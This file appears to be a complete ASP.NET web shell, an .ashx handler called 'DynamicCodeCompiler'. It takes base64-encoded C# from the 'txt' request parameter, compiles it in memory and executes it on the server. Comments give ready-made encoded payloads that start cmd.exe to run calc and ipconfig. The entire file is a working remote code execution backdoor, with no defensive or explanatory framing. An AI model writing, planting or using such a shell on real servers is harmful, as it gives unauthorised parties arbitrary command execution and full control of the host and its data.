<%@ WebHandler Language="C#" class="DynamicCodeCompiler"%>
using System;
using System.Web;
using System.CodeDom.Compiler;
using System.Reflection;
using System.Text;

public partial class DynamicCodeCompiler : IHttpHandler
{
    public bool IsReusable
    {
        get { return false; }
    }

    public static string SourceText(string txt)
    {
            StringBuilder sb = new StringBuilder();
            sb.Append("using System;");
            sb.Append(Environment.NewLine);
            sb.Append("namespace  Neteye");
            sb.Append(Environment.NewLine);
            sb.Append("{");
            sb.Append(Environment.NewLine);
            sb.Append("    public class NeteyeInput");
            sb.Append(Environment.NewLine);
            sb.Append("    {");
            sb.Append(Environment.NewLine);
            sb.Append("        public void OutPut()");
            sb.Append(Environment.NewLine);
            sb.Append("        {");
            sb.Append(Environment.NewLine);
            sb.Append(Encoding.GetEncoding("UTF-8").GetString(Convert.FromBase64String(txt)));
            sb.Append(Environment.NewLine);
            sb.Append("        }");
            sb.Append(Environment.NewLine);
            sb.Append("    }");
            sb.Append(Environment.NewLine);
            sb.Append("}");
            string code = sb.ToString();
            return code;
    }
    public static void DynamicCodeExecute(string txt)
    {

            CodeDomProvider compiler = CodeDomProvider.CreateProvider("C#"); ;     //编译器
            CompilerParameters comPara = new CompilerParameters();   //编译器参数
            comPara.ReferencedAssemblies.Add("System.dll");
            comPara.GenerateExecutable = false;
            comPara.GenerateInMemory = true;
            CompilerResults compilerResults = compiler.CompileAssemblyFromSource(comPara, SourceText(txt)); 
            Assembly objAssembly = compilerResults.CompiledAssembly;
            object objInstance = objAssembly.CreateInstance("Neteye.NeteyeInput");
            MethodInfo objMifo = objInstance.GetType().GetMethod("OutPut");
            var result = objMifo.Invoke(objInstance, null);
    }

    public void ProcessRequest(HttpContext context)
    {
            context.Response.ContentType = "text/plain";
            if (!string.IsNullOrEmpty(context.Request["txt"]))
            {
                //start calc: System.Diagnostics.Process.Start("cmd.exe","/c calc"); => U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuU3RhcnQoImNtZC5leGUiLCIvYyBjYWxjIik7
            //show ipconfig: System.Diagnostics.Process.Start("cmd.exe","/c ipconfig"); => U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuU3RhcnQoImNtZC5leGUiLCIvYyBpcGNvbmZpZyIpOw==
                DynamicCodeExecute(context.Request["txt"]);
                context.Response.Write("Execute Status: Success!");
            }
            else
            {
                context.Response.Write("Just For Fun, Please Input txt!");
            }
    }
}
